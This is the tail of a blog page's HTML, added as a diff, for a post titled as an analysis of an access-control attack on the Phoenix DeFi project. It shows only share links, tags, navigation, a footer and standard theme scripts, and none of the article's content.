+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://yinhui1984.github.io/phoenix-access-control-attack/" data-title="Phoenix 访问控制攻击分析" data-hashtags="defi"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://yinhui1984.github.io/phoenix-access-control-attack/" data-hashtag="defi"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://yinhui1984.github.io/phoenix-access-control-attack/" data-title="Phoenix 访问控制攻击分析"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://yinhui1984.github.io/phoenix-access-control-attack/" data-title="Phoenix 访问控制攻击分析"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://yinhui1984.github.io/phoenix-access-control-attack/" data-title="Phoenix 访问控制攻击分析"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/defi/">defi</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/uniswap/" class="prev" rel="prev" title="Uniswap"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Uniswap</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.110.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/yinhui1984" target="_blank">zhouyinhui</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":200},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
